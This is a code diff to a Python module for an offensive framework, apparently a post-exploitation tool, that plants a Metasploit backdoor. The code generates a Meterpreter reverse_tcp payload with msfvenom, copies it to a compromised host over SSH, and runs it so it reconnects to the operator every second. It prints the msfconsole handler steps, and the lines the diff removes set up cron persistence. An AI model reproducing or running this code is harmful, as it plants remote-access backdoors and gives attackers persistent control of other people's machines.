@@ -5,7 +5,7 @@ class Metasploit(Backdoor):
     
     def __init__(self, target, core):
         cmd.Cmd.__init__(self)
-        self.intro = GOOD + "Using metasploit module"
+        self.intro = GOOD + "Using Metasploit backdoor..."
         self.target = target
         self.core = core
         self.payload = "linux/x86/meterpreter/reverse_tcp"
@@ -17,7 +17,9 @@ class Metasploit(Backdoor):
                 "encoder" : Option("encoder", "none", "encoder to use for the backdoor", False),
                 "name"    : Option("name", "initd", "name of the backdoor", False)
                 }
-    
+        self.enabled_modules = {}
+        self.modules = {} 
+        self.command = "watch -n1 nohup ./initd > /dev/null" 
     def get_value(self, name):
         if name in self.options:
             return self.options[name].value
@@ -49,20 +51,15 @@ class Metasploit(Backdoor):
         payload = self.get_value("payload")
         name = self.get_value("name")
         bformat = self.get_value("format")
-
-        cron = (raw_input(" + Press y to start backdoor as a cronjob (recommended): ") == 'y')
         #os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
         os.system("msfvenom -p %s LHOST=%s LPORT=%s -f %s X -o %s" % (payload, self.core.localIP, port, bformat, name))
         self.target.scpFiles(self, 'initd', False)
         print(GOOD + "Backdoor script moved")
         self.target.ssh.exec_command("chmod +x initd")
-        if cron:
-           self.target.ssh.exec_command("crontab -l > mycron")
-           self.target.ssh.exec_command("echo \"* * * * * ./initd\" >> mycron && crontab mycron && rm mycron")
         print(GOOD + "Backdoor attempted on port %s. Backdoor will attempt to reconnect every second, and will stop attempting once connection is made. To access, open msfconsole and run:" % port)
         print("use multi/handler")
         print("> set PAYLOAD %s" % payload)
         print("> set LHOST %s" % self.core.localIP)
         print("> exploit")
         raw_input(GOOD + "Press any key to launch exploit once msfconsole is listening...")
-        self.target.ssh.exec_command("watch -n1 nohup ./initd > /dev/null")
+        self.target.ssh.exec_command(self.command)
